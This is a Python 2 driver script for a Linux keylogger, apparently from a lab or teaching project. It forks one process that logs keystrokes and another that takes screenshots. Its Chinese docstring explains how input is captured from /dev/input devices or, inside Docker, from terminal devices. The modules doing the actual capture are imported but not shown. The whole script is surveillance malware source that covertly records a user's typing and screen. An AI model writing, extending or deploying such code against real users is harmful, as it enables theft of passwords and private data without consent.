# coding: utf-8
import sys
import os
import threading

from keylogger.keyboard import linux_thread_func 
from keylogger.keylogger import virtual_thread_func
from screenshot import screen_shot


def keylogger_func(file_name, file_type):
    """
    根据当前系统环境判断从哪里获取输入设备：
        1. 在docker实验环境中， 没有物理输入设备， 即/dev/input/ 目录不存在
           此时只能通过 /dev/pst/ 下的终端来获取系统的输入
        2. 在实际的linux物理机和vmware, xvbox的虚拟机下，我们通过/dev/input下的输入设备
           来记录用户的键盘操作
    """
    if "linux" not in sys.platform:
        print u"该程序只能在linux下运行，windows和macos暂不支持"
        sys.exit(-1)
    if not os.path.exists("/dev/input/"):
        virtual_thread_func(file_name,file_type)
    else:
        linux_thread_func(file_name,file_type)


def main(key_name, pic_name, key_type='txt', pic_type='png'):
    # keyboard_th = threading.Thread(target=keylogger_func, args=(key_name, key_type))
    # screen_shot_th = threading.Thread(target=screen_shot, args=(pic_name, pic_type))
    

    # keyboard_th.setDaemon(True)
    # screen_shot_th.setDaemon(True)
    # screen_shot_th.start()
    # keyboard_th.start()
    # screen_shot_th.join()
    # keyboard_th.join()
    f = os.fork()
    if f == 0:
       screen_shot(pic_name, pic_type)
    else:
       keylogger_func(key_name, key_type)

if __name__ == '__main__':
    main("key", "shot")
